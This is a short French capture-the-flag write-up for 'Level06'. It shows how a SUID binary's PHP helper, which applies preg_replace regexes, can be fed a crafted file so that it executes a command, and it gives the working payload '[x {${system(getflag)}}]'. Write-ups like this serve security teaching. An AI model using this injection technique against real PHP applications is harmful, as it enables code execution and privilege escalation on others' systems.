# Level06

[ENGLISH version](README_EN.md)

## Comment récuperer le flag

On peut voir deux fichier dans le home.

Un fichier level06.php et un fichier level06 qui est un programme C compilé.

Ce dernier possède un bit SUID.

En le decompilant, on peut voir dans son code source qu'il utilise execve, mais appele également le fichier php.

Dans le fichier PHP, on peut voir des regex.

En utilisant https://regex101.com/ pour les comprendre, on peut voir qu'elle remplacent certaines parties de texte par d'autre, grace a preg_replace.

On peut aussi voir que le fichier PHP essaie d'acceder a un fichier, avec get_file_content

En se basant sur les challenges precedent, on peut réussir a executer des commandes en utilisant des sous shells. Par exemple,

```
echo "$(getflag) > /tmp/pass2" > /tmp/test
./level06 /tmp/test 
```

retourne:

Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :) > /tmp/pass2

En debugant les regex, on peut récuperer le flag en faisant:

```
echo '[x {${system(getflag)}}]' > /tmp/test
./level06 /tmp/test
```

## Le flag

Le flag lu est celui utilisable pour se connecter a level06